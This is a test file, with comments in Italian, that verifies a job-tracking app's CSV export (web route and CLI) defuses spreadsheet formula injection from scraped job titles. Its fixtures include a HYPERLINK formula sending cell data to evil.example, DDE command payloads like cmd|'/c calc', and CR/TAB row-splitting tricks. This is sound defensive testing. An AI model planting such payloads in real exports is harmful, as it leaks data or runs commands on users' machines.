/**
 * #159 — un CSV esportato non deve poter eseguire niente all'apertura.
 *
 * Titoli annuncio e nomi azienda sono **scrapati dalle job board**: il primo
 * carattere lo sceglie chi pubblica l'annuncio, e in un foglio di calcolo il
 * primo carattere decide se la cella è un dato o una formula. Le virgolette
 * RFC 4180 non c'entrano: il parser CSV le toglie prima che il motore di
 * calcolo veda il valore.
 *
 * I test guidano **entrambe le strade** — la route web e il comando CLI —
 * perché la funzione era copiata due volte e chiuderne una sola non chiude
 * niente. Se una delle due tornasse a farsi la sua, qui diventa rosso.
 */
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { csvCell, neutralizeFormula, toCsv } from "../../../shared/export/csv.js";

const mocks = vi.hoisted(() => ({
  requireAuth: vi.fn(),
  readJsonSafe: vi.fn(),
}));

vi.mock("@/lib/auth", () => ({ requireAuth: mocks.requireAuth }));
vi.mock("@/lib/json-files", () => ({ readJsonSafe: mocks.readJsonSafe }));

/** I sei modi di aprire una formula, con l'aria di un titolo vero. */
const POISONED_TITLES = {
  "=": '=HYPERLINK("https://evil.example/?d="&A1,"Senior Developer")',
  "+": "+Senior Developer",
  "-": "-1+cmd|'/c calc'!A0",
  "@": "@SUM(A1:A9)",
  "\t": "\t=HYPERLINK(\"https://evil.example\",\"Backend Engineer\")",
  "\r": "\r=1+1",
} as const;

/**
 * La formula che NON è in prima posizione, e proprio per questo passa: fuori
 * dalle virgolette un CR chiude la riga, quindi `=1+1` diventa la prima
 * cella di una riga nuova — una cella che il neutralizzatore non ha mai
 * visto, perché il campo di partenza cominciava per `B`.
 */
const SPLIT_TITLES = {
  "\r": "Backend Engineer\r=1+1",
  "\t": "Backend Engineer\t=2+2",
} as const;

const FORMULA_LEADERS = ["=", "+", "-", "@", "\t", "\r"];
const PLAIN_NUMBER = /^[+-]?\d+(?:\.\d+)?(?:[eE][+-]?\d+)?$/;

/**
 * Il minimo RFC 4180 che serve per rileggere quello che abbiamo scritto.
 * Un parser vero è esattamente ciò che sta fra il nostro file e il motore di
 * calcolo: se la difesa vive solo nelle virgolette, qui sparisce.
 *
 * **Fuori dalle virgolette un CR chiude la riga**, da solo o seguito da LF:
 * è quello che fanno Excel, LibreOffice e Sheets, ed è il motivo per cui un
 * CR in mezzo a un titolo non è un carattere qualunque.
 */
function parseCsv(text: string): string[][] {
  const rows: string[][] = [[]];
  let field = "";
  let quoted = false;
  for (let i = 0; i < text.length; i += 1) {
    const char = text[i];
    if (quoted) {
      if (char !== '"') field += char;
      else if (text[i + 1] === '"') {
        field += '"';
        i += 1;
      } else quoted = false;
      continue;
    }
    if (char === '"') quoted = true;
    else if (char === ",") {
      rows[rows.length - 1].push(field);
      field = "";
    } else if (char === "\n" || char === "\r") {
      if (char === "\r" && text[i + 1] === "\n") i += 1;
      rows[rows.length - 1].push(field);
      field = "";
      rows.push([]);
    } else field += char;
  }
  rows[rows.length - 1].push(field);
  return rows;
}

/** La domanda vera: quella cella, aperta in Excel, viene valutata? */
function reachesFormulaEngine(cell: string): boolean {
  if (cell.length === 0) return false;
  if (!FORMULA_LEADERS.includes(cell[0])) return false;
  return !PLAIN_NUMBER.test(cell);
}

function cellsOf(csv: string): string[] {
  return parseCsv(csv).flat();
}

describe("neutralizzatore condiviso", () => {
  it("marca come testo ognuno dei sei modi di aprire una formula", () => {
    for (const [leader, title] of Object.entries(POISONED_TITLES)) {
      const cell = neutralizeFormula(title);
      expect(cell, `carattere iniziale ${JSON.stringify(leader)}`).toBe(
        `'${title}`,
      );
      expect(reachesFormulaEngine(cell)).toBe(false);
    }
  });

  it("lascia stare un titolo normale, e un numero resta un numero", () => {
    // Un export che marca come testo tutti i negativi è un export peggiore,
    // e un numero scritto per intero non può essere una formula.
    for (const ordinary of [
      "Senior Developer",
      "Acme S.p.A.",
      "-5",
      "+3.14",
      "1e9",
      "",
    ]) {
      expect(neutralizeFormula(ordinary)).toBe(ordinary);
    }
  });

  it("le virgolette RFC 4180 restano, ma dopo il marcatore", () => {
    // L'ordine è il punto: virgolettare e basta non difende, e neutralizzare
    // senza virgolettare sposta le colonne al primo titolo con la virgola.
    expect(csvCell('=cmd|"/c calc"!A0, subito')).toBe(
      "\"'=cmd|\"\"/c calc\"\"!A0, subito\"",
    );
  });

  it("un CR o un TAB in MEZZO al campo non aprono una riga nuova", () => {
    // Il neutralizzatore guarda il primo carattere: qui è `B`, e non c'è
    // niente da marcare. A difendere è il virgolettamento — RFC 4180 lo
    // prescrive per i campi che contengono CR, e senza quello un titolo così
    // non sposta soltanto le colonne: apre una riga la cui prima cella è una
    // formula.
    const rows = [{ title: SPLIT_TITLES["\r"], note: SPLIT_TITLES["\t"] }];

    const parsed = parseCsv(toCsv(rows));

    expect(parsed).toHaveLength(2);
    expect(parsed[1]).toEqual([rows[0].title, rows[0].note]);
    expect(parsed.flat().filter(reachesFormulaEngine)).toEqual([]);
  });

  it("round-trip: un titolo ordinario con virgole e virgolette torna identico", () => {
    const rows = [
      { title: 'Senior "Full Stack" Developer, remote', company: "Acme, Inc." },
      { title: "Junior\nDeveloper", company: "Beta" },
    ];

    const parsed = parseCsv(toCsv(rows));

    expect(parsed[0]).toEqual(["title", "company"]);
    expect(parsed[1]).toEqual([rows[0].title, rows[0].company]);
    expect(parsed[2]).toEqual([rows[1].title, rows[1].company]);
  });

  it("anche l'intestazione passa di qui: le chiavi vengono dal JSON, non da noi", () => {
    const csv = toCsv([{ "=cmd|'/c calc'!A0": "x" }]);

    expect(cellsOf(csv).every((cell) => !reachesFormulaEngine(cell))).toBe(true);
  });
});

describe("GET /api/export?format=csv — la strada del sito", () => {
  beforeEach(() => {
    mocks.requireAuth.mockResolvedValue(null);
  });

  afterEach(() => {
    vi.restoreAllMocks();
    vi.resetModules();
  });

  it("un titolo scrapato che apre una formula esce inerte", async () => {
    const titles = [
      ...Object.values(POISONED_TITLES),
      ...Object.values(SPLIT_TITLES),
    ];
    const rows = titles.map((title, index) => ({
      title,
      company: "=1+1",
      createdAt: Date.now() - 1000 * (index + 1),
    }));
    mocks.readJsonSafe.mockReturnValue(rows);
    const { GET } = await import("@/app/api/export/route");

    const response = await GET({
      nextUrl: new URL("http://localhost/api/export?source=jobs&format=csv"),
    } as never);
    const csv = await response.text();

    const parsed = parseCsv(csv);
    // Intestazione più una riga per annuncio: nessun campo ha aperto righe
    // che nessuno ha esportato.
    expect(parsed).toHaveLength(rows.length + 1);
    expect(parsed.flat()).toContain(`'${POISONED_TITLES["="]}`);
    expect(parsed.flat().filter(reachesFormulaEngine)).toEqual([]);
  });
});

describe("jht export --csv — la strada del terminale", () => {
  let home: string;
  let originalJhtHome: string | undefined;

  beforeEach(() => {
    originalJhtHome = process.env.JHT_HOME;
    home = mkdtempSync(join(tmpdir(), "jht-export-csv-"));
    process.env.JHT_HOME = home;
    process.exitCode = undefined;
  });

  afterEach(() => {
    vi.restoreAllMocks();
    vi.resetModules();
    rmSync(home, { recursive: true, force: true });
    if (originalJhtHome === undefined) delete process.env.JHT_HOME;
    else process.env.JHT_HOME = originalJhtHome;
    process.exitCode = undefined;
  });

  it("un valore che apre una formula esce inerte anche da qui", async () => {
    // Le sorgenti del comando oggi sono interne (sessioni, task, config,
    // analytics), ma il file lo apre lo stesso foglio di calcolo e la
    // funzione è la stessa: la copia CLI è quella che usa chi lavora dal
    // terminale.
    const titles = [
      ...Object.values(POISONED_TITLES),
      ...Object.values(SPLIT_TITLES),
    ];
    mkdirSync(join(home, "tasks"), { recursive: true });
    writeFileSync(
      join(home, "tasks/tasks.json"),
      JSON.stringify({
        tasks: titles.map((title) => ({ title, note: "Acme, Inc." })),
      }),
    );
    vi.spyOn(console, "log").mockImplementation(() => {});
    const output = join(home, "export.csv");
    const { handleExport } = await import("../../../cli/src/commands/export.js");

    await handleExport("tasks", { csv: true, output });
    const csv = readFileSync(output, "utf-8");

    const parsed = parseCsv(csv);
    expect(parsed).toHaveLength(titles.length + 1);
    expect(parsed.flat()).toContain(`'${POISONED_TITLES["@"]}`);
    expect(parsed.flat().filter(reachesFormulaEngine)).toEqual([]);
    expect(process.exitCode).toBeUndefined();
  });
});
